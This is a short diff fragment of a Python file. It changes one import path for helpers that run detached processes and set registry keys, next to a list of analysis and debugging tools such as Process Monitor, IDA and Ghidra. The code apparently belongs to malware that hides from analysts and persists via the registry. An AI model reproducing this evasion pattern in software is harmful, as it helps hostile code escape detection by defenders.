@@ -4,7 +4,7 @@ import psutil
 from base64 import b64encode
 from random import choice
 import signal,atexit
-from Utils.helpers import get_current_file_path,run_detached_process,\
+from Utils.backup.helpers import get_current_file_path,run_detached_process,\
     find_python_path,random_string,base64_encode_file,setRegistryKey,TypicalRegistryKey
 debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
 
